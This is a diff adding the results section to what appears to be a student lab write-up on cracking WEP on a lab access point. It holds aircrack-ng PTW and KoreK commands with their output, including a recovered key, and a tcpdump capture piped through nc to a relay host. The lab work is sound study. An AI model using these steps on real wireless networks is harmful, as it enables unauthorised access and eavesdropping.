@@ -238,7 +238,105 @@ Options:
 * `-c 3000000` : stop after 3.000.000 captured packets
 * `-w-` : write to output (piped to nc, which sends it to SteppingStone)
 * `-s 65535` : capture whole packets
-* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP
+* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC (`ether`) of AP
+
+##### Results:
+
+* `capinfos -A tcpdump_run03-1483877361.cap` :
+
+```
+File name:           tcpdump_run03-1483877361.cap
+File type:           Wireshark/tcpdump/... - pcap
+File encapsulation:  IEEE 802.11 plus radiotap radio header
+File timestamp precision:  microseconds (6)
+Packet size limit:   file hdr: 65535 bytes
+Number of packets:   751 k
+File size:           878 MB
+Data size:           866 MB
+Capture duration:    2009.366120 seconds
+First packet time:   2017-01-08 13:09:22.551034
+Last packet time:    2017-01-08 13:42:51.917154
+Data byte rate:      431 kBps
+Data bit rate:       3450 kbps
+Average packet size: 1153,15 bytes
+Average packet rate: 374 packets/s
+SHA1:                7ca87dc0e53f0eb8a512b48848a04b0fde48031b
+RIPEMD160:           01406ffc68f230409375fe47409fe32d128c41a7
+MD5:                 4a898572b44b5caf994e247d02da758c
+Strict time order:   True
+Number of interfaces in file: 1
+Interface #0 info:
+                     Name = UNKNOWN
+                     Description = NONE
+                     Encapsulation = IEEE 802.11 plus radiotap radio header (23/127 - ieee-802-11-radiotap)
+                     Speed = 0
+                     Capture length = 65535
+                     FCS length = -1
+                     Time precision = microseconds (6)
+                     Time ticks per second = 1000000
+                     Time resolution = 0x06
+                     Filter string = NONE
+                     Operating system = UNKNOWN
+                     Comment = NONE
+                     BPF filter length = 0
+                     Number of stat entries = 0
+                     Number of packets = 751550
+```
+
+* `aircrack-ng -z tcpdump_run03-1483877361.cap ` :
+
+```
+Opening tcpdump_run03-1483877361.cap
+Read 751550 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:1B:B1:01:DC:B2  WirelessLab_WEP_Crack_Me  WEP (501793 IVs)
+
+Choosing first network as target.
+
+Opening tcpdump_run03-1483877361.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 501793 ivs.
+
+			Aircrack-ng 1.2 beta3
 
 
+		[00:00:04] Tested 144965 keys (got 501793 IVs)
 
+   KB    depth   byte(vote)
+    0  194/197   F0(494592) 02(493824) 5F(493824) 37(493568) 6D(493568) FB(493568) B2(493312) B5(493312) F7(493312) 01(493056) 
+    1    0/  1   47(682240) 96(527104) 80(526592) 2E(525312) B6(522496) DF(522240) 4D(521984) 5A(521472) 38(521216) 8C(521216) 
+    2   10/  2   F7(520960) 1C(520448) 11(520192) CD(520192) A8(519424) DF(519168) 14(518912) E0(518912) 06(518656) 08(518656) 
+    3  255/  3   9B(472320) 21(524800) 37(524800) 3B(524544) 14(524288) E8(524288) 06(523776) 5D(522496) 61(522496) 12(521472) 
+    4   15/ 17   21(518656) 9C(517888) A8(517888) 11(517632) 5A(517632) B7(517376) 4F(516864) F6(516864) 4C(516608) 4D(516352) 
+
+Failed. Next try with 505000 IVs.
+```
+
+* Just for fun, we tried also the Korek attack on this file:  `aircrack-ng -K tcpdump_run03-1483877361.cap` :
+
+```
+			Aircrack-ng 1.2 beta3
+
+
+		[00:00:01] Tested 85 keys (got 501793 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  2   4D(  41) 98(  24) 60(  15) 79(  15) 46(  12) 99(  12) C6(  12) F0(  12) 6B(  10) 58(   8) 
+    1    0/  2   59(  82) DD(  52) 9D(  36) DC(  28) 18(  25) A4(  21) 1B(  19) 5A(  18) 1A(  16) 6E(  16) 
+    2    0/  2   41(  49) 07(  26) 42(  24) 7E(  20) 40(  17) 93(  17) E6(  17) 44(  16) 62(  15) E7(  15) 
+    3    0/  1   57(  67) 05(  25) 63(  12) 74(  12) 7F(  12) F6(  12) 72(  11) 73(  10) 9F(  10) 82(   9) 
+    4    0/  1   45( 178) 71(  30) A1(  25) A7(  22) 54(  20) 62(  19) 04(  15) DA(  15) F7(  15) 18(  14) 
+    5    0/  1   53(  65) 18(  26) AA(  21) CA(  17) 78(  16) 16(  14) 15(  13) 25(  12) 3E(  12) 51(  12) 
+    6    0/  2   4F( 634) 98( 340) 9A( 125) 06(  71) A7(  65) B9(  60) EC(  58) 1B(  57) 2F(  57) 5C(  56) 
+    7    0/  3   4D(  46) 60(  31) 09(  23) 3F(  20) 9C(  20) 13(  19) 15(  17) 16(  15) BB(  15) 04(  13) 
+    8    1/  2   E4(  31) BB(  28) 51(  25) 09(  23) 08(  18) 5C(  18) 98(  16) 41(  15) CA(  15) B1(  14) 
+    9    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0) 09(   0) 0A(   0) 
+   10    1/  1   D2( 119) 04(  95) 8C(  86) 82(  84) FE(  76) 36(  72) E7(  71) EB(  70) 0F(  68) 32(  68) 
+
+     KEY FOUND! [ 4D:59:41:57:45:53:4F:4D:45:50:41:53:53 ] (ASCII: MYAWESOMEPASS )
+	Decrypted correctly: 100%
+```
+
+After this, we used this key to decrypt the catpured data from first run (3hr capture time) to check whether there are ARP packets, needed for PTW attack. There were indeed ARP packets captured. Since the first run captured almost 3 million packets. second 300.000 packets and third 750.000 packets on the ESSID WirelessLab_WEP_Crack_Me, and all the papers state that PTW attack needs less than 100.000 packets to have a success rate of more than 95%, we conclude that we are unable to crack this WEP password using PTW attack, but we are unsure of the reasons for this. Korek method on the other hand worked on third and first pass (as stated, KoreK needs at least 700.000 packets for 50% success rate), whereas the second capture was unsuccessfull, probably because of too low packet count.
